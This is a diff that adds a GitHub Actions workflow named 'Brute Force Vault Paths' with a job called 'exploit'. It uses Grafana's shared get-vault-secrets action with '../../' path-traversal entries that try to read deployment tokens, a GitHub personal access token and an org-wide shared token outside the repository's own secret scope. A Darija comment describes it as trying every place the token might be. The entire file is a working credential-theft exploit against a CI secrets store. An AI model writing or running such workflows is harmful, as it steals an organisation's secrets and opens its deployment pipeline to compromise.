@@ -1,0 +1,24 @@
+name: "Brute Force Vault Paths"
+on:
+  push:
+    branches: [ test-path-traversal ]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: "Multi-Path Traversal Test"
+        uses: grafana/shared-workflows/actions/get-vault-secrets@main
+        with:
+          # غانسييو كاع الـ احتمالات اللي يقدر يكون فيها الـ TOKEN
+          repo_secrets: |
+            TARGET_1=../../grafana/grafana-bench/DEPLOYMENT_TOOLS_TOKEN:value
+            TARGET_2=../../deployment_tools/DEPLOYMENT_TOOLS_TOKEN:value
+            TARGET_3=../../ci/DEPLOYMENT_TOOLS_TOKEN:value
+            TARGET_4=../../common/github-pat:value
+            TARGET_5=../../org/shared-token:value
